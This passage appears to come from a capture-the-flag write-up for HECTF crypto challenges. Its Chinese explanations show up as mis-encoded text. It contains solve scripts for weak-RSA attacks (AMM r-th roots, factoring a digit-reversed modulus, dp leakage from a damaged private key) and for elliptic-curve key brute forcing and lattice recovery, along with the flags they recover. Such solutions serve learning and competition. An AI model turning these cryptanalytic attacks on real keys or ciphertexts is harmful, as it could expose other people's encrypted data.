class="keyword">while</span>(s % r == <span class="number">0</span>):</span><br><span class="line">        s = s//r</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s*k+<span class="number">1</span>) % r != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    a = powmod(p, r**(t-<span class="number">1</span>)*s, q)</span><br><span class="line">    b = powmod(o, r*a-<span class="number">1</span>, q)</span><br><span class="line">    c = powmod(p, s, q)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = powmod(<span class="built_in">int</span>(b), r**(t-<span class="number">1</span>-i), q)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (-math.log(d, a)) % r</span><br><span class="line">        b = (b*(c**(r*j))) % q</span><br><span class="line">        h = (h*c**j) % q</span><br><span class="line">        c = (c*r) % q</span><br><span class="line">    result = (powmod(o, alp, q)*h)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr*m) % q</span><br><span class="line">        <span class="comment"># assert(pow(r, e, q) == cq)</span></span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CHECK2</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = invert(q, p)</span><br><span class="line">    t2 = invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1*t1*q+mq1*t2*p) % (p*q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_ROOT</span>(<span class="params">r, q</span>):</span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, <span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">rt1 = AMM_ROOT(e, p)</span><br><span class="line">rt2 = AMM_ROOT(<span class="number">1009</span>, q)</span><br><span class="line"></span><br><span class="line">ammp = AMM_Solution(mp, p, rt1, cp, e)</span><br><span class="line">ammq = AMM_Solution(mq, q, rt2, cq, <span class="number">1009</span>)</span><br><span class="line"></span><br><span class="line">d = invert(<span class="number">7</span>, q-<span class="number">1</span>)</span><br><span class="line">mqs = []</span><br><span class="line"><span class="keyword">for</span> mq <span class="keyword">in</span> ammq:</span><br><span class="line">    mqs.append(<span class="built_in">pow</span>(mq, d, q))</span><br><span class="line">ammq = mqs</span><br><span class="line">CHECK2(ammp, ammq, e, p, q)</span><br><span class="line"><span class="comment">##HECTF&#123;go0d_jOb_At_AmM&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ç¿»ä¸€ç¿»"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»">#</a> ç¿»ä¸€ç¿»ï¼š</h3><p>çˆ†ç ´æ€è·¯ç±»ä¼¼ RSA parity oracleã€‚p,q æ˜¯ bit ç¿»è½¬å…³ç³»ï¼Œ å·²çŸ¥ p æœ€ä½çš„ k ä½ï¼Œåˆ™å·²çŸ¥ q</p><p>æœ€é«˜çš„ k ä½ã€‚å‡è®¾å·²çŸ¥ k ä½çš„ p,q ï¼Œè®°ä¸º ph,qhï¼Œåˆ©ç”¨ä¸ç­‰å¼</p><p>ph Â·qh.21024-2k &lt;=n&lt;(ph+1) Â·(qh+ 1).21024-2k</p><p>é€ä½å‘ä½åœ°å€çˆ†ç ´ï¼Œä¸æ–­æ”¶ç¼©ä¸ç­‰å¼çš„èŒƒå›´ï¼Œæœ€ç»ˆå¯æ±‚å¾— pï¼Œq çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">10</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span></span><br><span class="line">q = <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">m = base64.b64decode(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸åˆæ ¼çš„é­”è¯"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯">#</a> ä¸åˆæ ¼çš„é­”è¯ï¼š</h3><p>æ ¹æ®é¢˜ç›®æè¿°çš„æç¤ºå¯ä»¥çœ‹åˆ°é¢˜ç›®ä¸­å¥½å‡ å¤„å‚æ•°ä¸åˆç†çš„åœ°æ–¹ï¼Œæ¯”å¦‚ p,q çš„å¤§å°ç­‰ï¼Œå› ä¸ºå¼‚æˆ–æ“ä½œå¹¶ä¸ä¼šæŠŠå¤šä½™çš„éƒ¨åˆ†å»æ‰ï¼Œæ‰€ä»¥å¯†æ–‡ä¸­æ³„éœ²äº†å¾ˆå¤šæ¶ˆæ¯ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•æ±‚ keyï¼Œè¿™æ—¶ä¸€ä¸ª ECDLP é—®é¢˜ï¼Œå¯ä»¥é‡‡ç”¨ MOV æ”»å‡»ï¼Œä¸è¿‡æ—¢ç„¶å‚æ•°ä¸åˆç†ï¼Œä¹Ÿå¯ä»¥å°è¯•çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line">q = <span class="number">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line">a = <span class="number">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line">b = <span class="number">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line">x = <span class="number">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class="line">x1 = <span class="number">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line">y1 = <span class="number">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line">c = [<span class="number">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class="number">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class="number">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class="number">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆæ±‚keyï¼Œå¯ä»¥ç”¨MOVæ”»å‡»ï¼Œä¹Ÿå¯ä»¥ç›´æ¥çˆ†ç ´ï¼Œè¿™é‡Œç›´æ¥çˆ†ç ´äº†</span></span><br><span class="line">Ep = EllipticCurve(GF(p), [a, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">G = Ep.lift_x(x)</span><br><span class="line">hint1 = Ep(x1, y1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> hint1 ==  key * G:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># key = 51517</span></span><br><span class="line"><span class="comment"># ç„¶åæ±‚flag,å¯ä»¥ç”¨é“œåŒ å®šç†ä¹Ÿå¯ä»¥æ„é€ æ ¼å­</span></span><br><span class="line">n = p*q</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">Cur=EllipticCurve(Zmod(n),[a,b])</span><br><span class="line">aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">x,y</span>):</span><br><span class="line">    M=Matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>*x*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="number">3</span>*x^<span class="number">2</span>+a)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,-<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,-<span class="number">2</span>*y*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">512</span>,(x^<span class="number">3</span>+a*x-y^<span class="number">2</span>+b)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n*<span class="number">2</span>^<span class="number">512</span>]])</span><br><span class="line">    v=M.LLL()[-<span class="number">1</span>]</span><br><span class="line">    dx=<span class="built_in">int</span>(v[<span class="number">2</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    dy=<span class="built_in">int</span>(v[<span class="number">4</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    gx=x+dx</span><br><span class="line">    gy=y+dy</span><br><span class="line">    m.append(x^^gx)</span><br><span class="line">    m.append(y^^gy)</span><br><span class="line">recover(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">recover(c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">out=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    out+=aes.decrypt(long_to_bytes(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ out+ <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦">#</a> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“è¯ä¹¦çš„åŸºæœ¬æ ¼å¼ åœ¨è¯ä¹¦ä¸­å¿…ç„¶å«æœ‰ -----BEGIN PRIVATE KEY-----<br> è¿™ä¸€æ®µå¯ä»¥æ‹†æˆ<br> 2d 2d 2d 2d 2d 42 45 47 49</p><p>4e 20 50 52 49 56 41 54 45</p><p>20 4b 45 59 2d 2d 2d 2d 2d<br> å’Œå·²ç»æ•´ç†å¥½çš„ç›¸æ¯”<br> 49 47 45 42 2d 2d 2d 2d 2d</p><p>45 54 41 56 49 52 50 20 4e</p><p>2d 2d 2d 2d 2d 59 45 4b 20<br> å¾ˆå®¹æ˜“çœ‹å‡º 1 å’Œ 9 æ¢ 2 å’Œ 8 æ¢ 3 å’Œ 7 æ¢ 4 å’Œ 6 æ¢</p><p>æˆ‘ä»¬å°†è¯ä¹¦æ•´ç†ä¸€ä¸‹ å¯ä»¥å¾—</p><p>30 82 04 bc 02 01 00 30 0d<br>06 09 2a 86 48 86 f7 0d 01<br>01 01 05 00 04 82 04 a6 30<br>82 04 a2 02 01 00 02 82 01<br>01 00 bd db 99 13 77 8d 23<br>15 44 9b 58 7f bd 7f 6e 41<br>94 4d 1c 9c 54 84 c9 b0 1f<br>bf 53 44 93 35 5c f8 84 89<br>cb f9 63 0f 42 99 bb 4d bb<br>84 df 7b d6 60 7b 7a 57 8f<br>84 e4 c6 d6 a7 0f 50 6c 16<br>a4 31 1b 15 08 e3 97 5d b7<br>1e 71 d6 d2 d1 7d d7 5b 9c<br>23 e2 d4 37 bc f7 f5 d9 50<br>6e 76 3c 71 22 a5 76 fd 5c<br>15 90 5a b4 5f eb a2 0a 24<br>12 86 28 5b 8b a5 d6 db d1<br>b7 d0 ce 97 5a b7 4e ae 33<br>8f e0 dd 5a 19 4d 02 91 8e<br>4f 0a d6 d1 60 f1 b7 30 74<br>3f c2 c8 eb 74 db 01 08 9d<br>21 0d 50 c5 aa 1f 25 97 93<br>b5 12 b2 6a 8f 3e 62 cc 6a<br>95 e9 ce f6 5e 5d 49 e9 e6<br>6d 35 2d db b1 40 8f a9 fe<br>5b 29 a1 64 2c 61 d2 c4 d3<br>2c 66 c5 6d d6 fa 36 39 b2<br>14 6b 1f 59 29 89 6a ba b4<br>b1 ed 35 ec f5 7d d6 30 ce<br>ca c1 5f cc 6b 74 3f 97 f0<br>86 f2 c6 04 0e 66 e9 1e 92<br>05 31 ba 61 2b e1 92 7b 67<br>54 52 5e 08 e5 19 02 03 01<br>00 01 02 82 01 00 04 62 04</p><p>ä¸­é—´è¢«æ‰“ç¢äº†<br> d4 8d 90 d8 0f 02 81 80 51<br>a5 f7 e7 f4 c0 50 a5 0e 18<br>fd e1 2f ce e2 64 6f 2b 43<br>16 0b 0c 75 ab 49 25 e8 26<br>9a e8 0e 70 cf 12 73 4f 41<br>fa b1 8d 04 24 ed 7c ce b7<br>dd b2 7c be 0f 55 4f 7a 6e<br>16 98 d4 ec 5b a2 b4 8d 61<br>2e 23 37 ae b7 5f 8a 57 d8<br>15 5a 11 d0 7b 2c 49 d3 d9<br>7c 4f f0 cf b8 9e 6d d4 f3<br>6c c3 7c 01 0b 5b c8 93 56<br>a3 9b 57 6c c3 ed d0 3c dc<br>4d 79 1d f5 09 1a 55 71 df<br>1a 6c 15 ee da a0 77 3c f3<br>cf 02 81 80 0f c6 1f 05 d1<br>9c 96 ee c3 ed ca cc a3 4e<br>1d 3e 2c ab 43 9b eb ab 66<br>93 a3 ce 2c a9 9f 88 ab 9c<br>dd 18 3c eb 8e 80 1d 82 98<br>f8 35 35 98 64 ef 19 1d b3<br>f5 32 69 97 6b a0 4b 03 60<br>6e 54 08 59 de cd 05 80 5c<br>4a a7 9d c6 db 22 38 06 58<br>ea f0 bf fb a0 f4 e7 19 bc<br>f1 b1 e0 41 69 d8 e0 cb 3a<br>f4 d9 0b 2e 62 d7 c7 ed 30<br>45 d4 9b 52 5c a7 15 ca 3b<br>84 f0 7b 4e ce 27 d0 4d 17<br>95 29 9f a1 86 cd 02 81 80<br>25 c2 0a b2 52 9f 1e fd 3d<br>35 34 7c 57 3b 28 2a bf d9<br>5b 26 4c 92 f6 c4 f9 ec 8b<br>7c 71 32 06 fb ea 18 86 88<br>0e 29 a3 6c 47 ef 9b b7 53<br>ce 95 67 ea 4d 3e 08 3c 30<br>f3 44 02 2f 95 b7 cd 71 14<br>81 3b f6 a2 8e cc 67 d5 fe<br>05 95 32 42 68 4c d2 9c 1c<br>5d d8 a7 44 16 89 0e 5c 94<br>3c 70 90 4b a7 0e 34 9b 15<br>71 9a 46 6f 90 1f bf 0c fc<br>78 40 f8 03 2e 31 af bc cf<br>b8 4f 4a 81 7e a5 1c 8f 90<br>fd 6a 2d 2d 2d 2d 2d 45 4e<br>44 20 50 52 49 56 41 54 45<br>20 4b 45 59 2d 2d 2d 2d 2d</p><p>æ ¹æ® rsa è¯ä¹¦æ ¼å¼ æˆ‘ä»¬å¯ä»¥å¾—åˆ°<br>æ ‡è¯†å¤´ 30</p><p>æ€»é•¿åº¦ 82 04bc</p><p>ç‰ˆæœ¬ä¿¡æ¯ 0201 00300d06092a864886f70d0101010500048204a6308204a2020100</p><p>n 02820101 00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</p><p>e 0203 010001</p><p>d 02820100</p><p>046204ï¼ˆæ²¡ç”¨ï¼‰</p><p>q d48d90d80fï¼ˆæ²¡ç”¨ï¼‰</p><p>dp 028180</p><p>51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</p><p>dq 028180</p><p>0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</p><p>inv(q,p) 028180</p><p>25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</p><p><img data-src="https://i-blog.csdnimg.cn/direct/3be30da7583d4ebd84509ed31b1e9164.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥é€šè¿‡ openssl è¿›è¡Œä¸€äº›äº†è§£ æˆ–è€…ä¿®è¡¥ç§é’¥ ä½†ä¸æ˜¯æœ¬é¢˜çš„è€ƒç‚¹<br>ï¼ˆä¸Šå›¾ä¸º openssl ä¸­ä¿®å¥½çš„ç§˜é’¥ å¯ä»¥çœ‹åˆ°åå…­è¿›åˆ¶éƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼‰</p><p>å¾—åˆ°è¿™äº›å æˆ‘ä»¬å°±å¯ä»¥æ¥ä¸€ä¸ªç®€å•çš„ dp æ³„éœ²<br>ä½†æ˜¯è¦æ³¨æ„ï¼Œæˆ‘ä¹‹å‰æåˆ°äº†æ˜æ–‡ä¸­æœ‰ä¸­æ–‡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨<br>ä¼ ç»Ÿçš„è§£å¯†è„šæœ¬æ— æ•ˆ</p><p>ä»¥ä¸‹æ˜¯è„šæœ¬</p><p>from Crypto.PublicKey import RSA<br>from Crypto.Cipher import PKCS1_OAEP<br>from Crypto.Util.number import inverse, long_to_bytes<br>import binascii</p><p>hex_p = â€œ0x00efaf90cae18eedc592a6cc57e6f4fb8812cd663274c90c0c82240b4a13c6d1772bab4f32f087cf3179f93513da0775529422f3c1ed5a0b8c2bd81bcd65a2451eab291585d1f39cc7dfc4c36ef2ff0e9be22d9252c80c7e11cd493542c27731965a5603dde878356433d07b99431eb69dc9856931583e9ced764503bded010857â€<br>hex_q = â€œ0x00cac7cc600b5e888df3f9e905d48d088d1a15819dbde1c8501028ffe3b02bf237acb277b43eda8a2110e9b6931cbfffe6eeade466611be17454f2d0c848a567e77065e82ff4f2aa0de7bfe1e622d060f67a5f6fc87e5859ed6aec857cf8124418b4c73a40628fdddd002504444acb31fb0b4ea35068ec8c1ffb933ed48d90d80fâ€<br>hex_e = â€œ0x10001â€<br>hex_c = â€œ0x92c8bf09c04cf0193306f9203b19956fbcbe796c6e65fdaefeb49c5fb0391c1f78552d5fb4385ba3dfd11efb23759fdc386a2336e827b0be5b3514522b8063149d584edef58f2d64b4e8d6c9e5813de1d27b4c3fe970abfb4495700ed04b496bf1eb8d90b5a836ba3d852e0038d943ce116d691ec1490750c62b1cd19a1816ade9325c9ac739255b1c24e95cc387050ff521c3f60882efe33c66409498654ed39bc6c1253c21e3e78dc67937666a2ae64826cfe4767f24a5712069ec3a31e0f36ce4ef473041f8df8e553e72771d81b6ef75a95d29172483fcc33ea9c396f98af037527d4f6bd0cbf033e1f8263aba1f1cb35fca87e119c4b953526be191ada6â€</p><p>p = int(hex_p, 16)<br>q = int(hex_q, 16)<br>e = int(hex_e, 16)<br>c = int(hex_c, 